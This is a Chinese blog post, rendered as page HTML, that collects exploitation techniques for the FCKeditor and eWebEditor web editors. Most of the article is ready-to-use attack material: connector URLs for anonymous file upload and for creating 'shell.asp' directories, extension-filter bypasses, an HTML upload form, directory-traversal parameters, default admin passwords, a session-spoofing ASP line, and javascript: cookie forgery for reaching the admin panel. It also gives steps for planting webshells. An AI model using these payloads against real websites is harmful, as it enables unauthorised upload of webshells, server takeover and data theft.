@@ -1,0 +1,571 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>并不全的编辑器漏洞 - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="并不全的编辑器漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-03 05:00" pubdate>
+        February 3, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      50
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">并不全的编辑器漏洞</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Editor-Vuln"><a href="#Editor-Vuln" class="headerlink" title="Editor Vuln"></a>Editor Vuln</h1><h2 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h2><h3 id="FCKeditor-编辑器页"><a href="#FCKeditor-编辑器页" class="headerlink" title="FCKeditor 编辑器页"></a>FCKeditor 编辑器页</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/_samples/</span><span class="hljs-keyword">default</span>.html<br>FCKeditor<span class="hljs-regexp">/_samples/</span><span class="hljs-keyword">default</span>.html<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample01.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample02.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample03.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample04.asp<br>fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.html<br></code></pre></td></tr></table></figure>
+<h3 id="FCKeditor-查看编辑器版本"><a href="#FCKeditor-查看编辑器版本" class="headerlink" title="FCKeditor 查看编辑器版本"></a>FCKeditor 查看编辑器版本</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">FCKeditor/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_whatsnew</span>.</span></span>html<br></code></pre></td></tr></table></figure>
+<p><strong>FCKeditor V2.43 版本</strong></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>php/config.php<br></code></pre></td></tr></table></figure>
+<p><strong>FCKeditor V2.6.6版本</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>asp/config.php<br></code></pre></td></tr></table></figure>
+<h3 id="FCKeditor-匿名上传文件"><a href="#FCKeditor-匿名上传文件" class="headerlink" title="FCKeditor 匿名上传文件"></a>FCKeditor 匿名上传文件</h3><p>影响版本:非优化/精简版本的FCKeditor<br>脆弱描述：<br>如果存在以下文件，打开后即可上传文件。<br>攻击利用:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/upload/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>jsp/connector<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/u</span>ploadtest.html<br></code></pre></td></tr></table></figure>
+<h3 id="FCKeditor-查看文件上传路径"><a href="#FCKeditor-查看文件上传路径" class="headerlink" title="FCKeditor 查看文件上传路径"></a>FCKeditor 查看文件上传路径</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></code></pre></td></tr></table></figure>
+<p>XML页面中第二行 <code>url=/xxx</code>的部分就是默认基准上传路径</p>
+<h3 id="FCKeditor被动限制策略所导致的过滤不严问题"><a href="#FCKeditor被动限制策略所导致的过滤不严问题" class="headerlink" title="FCKeditor被动限制策略所导致的过滤不严问题"></a>FCKeditor被动限制策略所导致的过滤不严问题</h3><p>影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3</p>
+<p>脆弱描述：</p>
+<p>FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|<br>pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm</p>
+<p>Fckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个<code>.</code>来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”</p>
+<p>另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。</p>
+<p>攻击利用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">允许其他任何后缀上传<br></code></pre></td></tr></table></figure>
+<h3 id="利用2003路径解析漏洞上传木马"><a href="#利用2003路径解析漏洞上传木马" class="headerlink" title="利用2003路径解析漏洞上传木马"></a>利用2003路径解析漏洞上传木马</h3><p>影响版本: 索引底部附录B</p>
+<p>脆弱描述：<br>利用2003系统路径解析漏洞的原理，创建类似<code>bin.asp</code>如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。</p>
+<p>攻击利用:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>asp/connector.asp<br></code></pre></td></tr></table></figure>
+<p>强制建立shell.asp目录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/</span>shell.asp&amp;NewFolderName=z&amp;uuid=<span class="hljs-number">1244789975684</span><br></code></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=CreateFolder&amp;CurrentFolder=/</span>&amp;Type=Image&amp;NewFolderName=shell.asp<br></code></pre></td></tr></table></figure>
+<p>**FCKeditor PHP上传任意文件漏洞<br>**</p>
+<p>影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2</p>
+<p>脆弱描述：</p>
+<p>FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。</p>
+<p>在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。</p>
+<p>成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> id=<span class="hljs-string">&quot;frmUpload&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span><br>action=<span class="hljs-string">&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;Upload a new <span class="hljs-keyword">file</span>:&lt;<span class="hljs-keyword">br</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;NewFile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> id=<span class="hljs-string">&quot;btnUpload&quot;</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;<br>&lt;/<span class="hljs-keyword">form</span>&gt;<br></code></pre></td></tr></table></figure>
+<p>Note:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。</p>
+<h3 id="FCKeditor-暴路径漏洞"><a href="#FCKeditor-暴路径漏洞" class="headerlink" title="FCKeditor 暴路径漏洞"></a>FCKeditor 暴路径漏洞</h3><p>影响版本：aspx版FCKeditor<br>攻击利用：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/</span><span class="hljs-number">1</span>.asp<br></code></pre></td></tr></table></figure>
+<h3 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法</h3><p>影响版本: FCKeditor =&gt; 2.4.x</p>
+<p>脆弱描述：</p>
+<p>我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。</p>
+<p>攻击利用:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">提交1<span class="hljs-selector-class">.php</span>+空格 就可以绕过去所有的,<br></code></pre></td></tr></table></figure>
+<p>※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]</p>
+<p>Note:<a target="_blank" rel="noopener" href="http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html">http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html</a></p>
+<h3 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）</h3><p>影响版本:=&gt;2.4.x的最新版已修补</p>
+<p>脆弱描述:</p>
+<p>由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。</p>
+<p>上传第一次。被过滤为123_asp;123.jpg 从而无法运行。<br>但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。<br>文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。<br>所以。IIS6的漏洞继续执行了。</p>
+<p>如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：</p>
+<p>1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。</p>
+<p>2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。</p>
+<p>3.FCKeditor的这个漏洞已经被修复。</p>
+<h3 id="FCKeditor-新闻组件遍历目录漏洞"><a href="#FCKeditor-新闻组件遍历目录漏洞" class="headerlink" title="FCKeditor 新闻组件遍历目录漏洞"></a>FCKeditor 新闻组件遍历目录漏洞</h3><p>影响版本:Aspx与JSP版FCKeditor</p>
+<p>脆弱描述：</p>
+<p>如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”<br>攻击利用:<br>修改CurrentFolder参数使用 ../../来进入不同的目录</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../</span>../..%<span class="hljs-number">2</span>F&amp;NewFolderName=aspx.asp<br></code></pre></td></tr></table></figure>
+<p>根据返回的XML信息可以查看网站所有的目录。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%<span class="hljs-number">2</span>F<br><br><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%<span class="hljs-number">2</span>F<br></code></pre></td></tr></table></figure>
+<h3 id="TYPE自定义变量任意上传文件漏洞"><a href="#TYPE自定义变量任意上传文件漏洞" class="headerlink" title="TYPE自定义变量任意上传文件漏洞"></a>TYPE自定义变量任意上传文件漏洞</h3><p>影响版本: 较早版本</p>
+<p>脆弱描述：</p>
+<p>通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。</p>
+<p>攻击利用:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/FCKeditor/</span>editor<span class="hljs-regexp">/filemanager/</span>browser<span class="hljs-regexp">/default/</span>browser.html?Type=all&amp;Connector=connectors<span class="hljs-regexp">/asp/</span>connector.asp<br></code></pre></td></tr></table></figure>
+<p>打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:<br><strong><a target="_blank" rel="noopener" href="http://www.xxxx.com/UserFiles/all/1.asp">http://www.xxxx.com/UserFiles/all/1.asp</a></strong><br><code>Type=all</code> 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.</p>
+<p>比如输入:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/FCKeditor/</span>editor<span class="hljs-regexp">/filemanager/</span>browser<span class="hljs-regexp">/default/</span>browser.html?Type=..<span class="hljs-regexp">/&amp;Connector=connectors/</span>asp/connector.asp<br></code></pre></td></tr></table></figure>
+<p>网马就可以传到网站的根目录下.</p>
+<p>Note:如找不到默认上传文件夹可检查此文件:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></code></pre></td></tr></table></figure>
+<h2 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h2><h3 id="eWebEditor-基础知识"><a href="#eWebEditor-基础知识" class="headerlink" title="eWebEditor 基础知识"></a>eWebEditor 基础知识</h3><p>默认后台地址：<br>/ewebeditor/admin_login.asp<br>/WebEdior/admin/login.aspx<br>建议最好检测下admin_style.asp文件是否可以直接访问</p>
+<p>默认数据库路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[PATH]<span class="hljs-regexp">/db/</span>ewebeditor.mdb<br>[PATH]<span class="hljs-regexp">/db/</span>db.mdb<br>[PATH]<span class="hljs-regexp">/db/</span>%<span class="hljs-number">23</span>ewebeditor.mdb<br></code></pre></td></tr></table></figure>
+<p>默认密码：</p>
+<p>admin/admin888 、 admin/admin、 admin/123456 、admin/admin999</p>
+<p>1、点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。</p>
+<p>2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell</p>
+<p>3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！</p>
+<p>4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。</p>
+<p>5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！<br>(请修改action字段)<br>Action.html</p>
+<p>6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客</p>
+<h3 id="eWebEditor-可下载数据库，但密文解不开"><a href="#eWebEditor-可下载数据库，但密文解不开" class="headerlink" title="eWebEditor 可下载数据库，但密文解不开"></a>eWebEditor 可下载数据库，但密文解不开</h3><p>脆弱描述：</p>
+<p>当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.</p>
+<p>攻击利用:</p>
+<p>比如 ID=46 s-name =standard1</p>
+<p>构造 代码: ewebeditor.asp?id=content&amp;style=standard</p>
+<p>ID和和样式名改过后<br>ewebeditor.asp?id=46&amp;style=standard1</p>
+<h3 id="eWebEditor遍历目录漏洞"><a href="#eWebEditor遍历目录漏洞" class="headerlink" title="eWebEditor遍历目录漏洞"></a>eWebEditor遍历目录漏洞</h3><p>脆弱描述：<br>ewebeditor/admin_uploadfile.asp<br>admin/upload.asp<br>过滤不严，造成遍历目录漏洞</p>
+<p>攻击利用:</p>
+<p>第一种:ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/../</a>.. 看到整个网站文件了<br>第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..</p>
+<h3 id="eWebEditor-5-2-列目录漏洞"><a href="#eWebEditor-5-2-列目录漏洞" class="headerlink" title="eWebEditor 5.2 列目录漏洞"></a>eWebEditor 5.2 列目录漏洞</h3><p>脆弱描述：<br>ewebeditor/asp/browse.asp<br>过滤不严，造成遍历目录漏洞<br>攻击利用：<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=%E2%80%A6././/">http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/</a>..</p>
+<h3 id="利用eWebEditor-session欺骗漏洞-进入后台"><a href="#利用eWebEditor-session欺骗漏洞-进入后台" class="headerlink" title="利用eWebEditor session欺骗漏洞,进入后台"></a>利用eWebEditor session欺骗漏洞,进入后台</h3><p>脆弱描述：<br>漏洞文件:Admin_Private.asp<br>只判断了session，没有判断cookies和路径的验证问题。<br>攻击利用:<br>新建一个test.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问test.asp，再访问后台任何文件，for example:Admin_Default.asp</p>
+<h3 id="eWebEditor-asp版-2-1-6-上传漏洞"><a href="#eWebEditor-asp版-2-1-6-上传漏洞" class="headerlink" title="eWebEditor asp版 2.1.6 上传漏洞"></a>eWebEditor asp版 2.1.6 上传漏洞</h3><p>攻击利用:（请修改action字段为指定网址）<br>ewebeditor asp版2.1.6上传漏洞利用程序.html</p>
+<h3 id="eWebEditor-2-7-0-注入漏洞"><a href="#eWebEditor-2-7-0-注入漏洞" class="headerlink" title="eWebEditor 2.7.0 注入漏洞"></a>eWebEditor 2.7.0 注入漏洞</h3><p>攻击利用:<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200">http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200</a><br>默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.</p>
+<h3 id="eWebEditor2-8-0最终版删除任意文件漏洞"><a href="#eWebEditor2-8-0最终版删除任意文件漏洞" class="headerlink" title="eWebEditor2.8.0最终版删除任意文件漏洞"></a>eWebEditor2.8.0最终版删除任意文件漏洞</h3><p>脆弱描述：<br>此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。<br>攻击利用: (请修改action字段为指定网址)<br>Del Files.html</p>
+<h3 id="eWebEditor-PHP-ASP-后台通杀漏洞"><a href="#eWebEditor-PHP-ASP-后台通杀漏洞" class="headerlink" title="eWebEditor PHP/ASP 后台通杀漏洞"></a>eWebEditor PHP/ASP 后台通杀漏洞</h3><p>影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。<br>攻击利用:<br>进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.<br>这时候你清空浏览器的url,然后输入</p>
+<p>javascript:alert(document.cookie=”adminuser=”+escape(“admin”));<br>javascript:alert(document.cookie=”adminpass=”+escape(“admin”));<br>javascript:alert(document.cookie=”admindj=”+escape(“1”));</p>
+<p>而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。</p>
+<h3 id="eWebEditor-for-php任意文件上传漏洞"><a href="#eWebEditor-for-php任意文件上传漏洞" class="headerlink" title="eWebEditor for php任意文件上传漏洞"></a>eWebEditor for php任意文件上传漏洞</h3><p>影响版本:ewebeditor php v3.8 or older version<br>脆弱描述:<br>此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。<br>攻击利用:<br>phpupload.html</p>
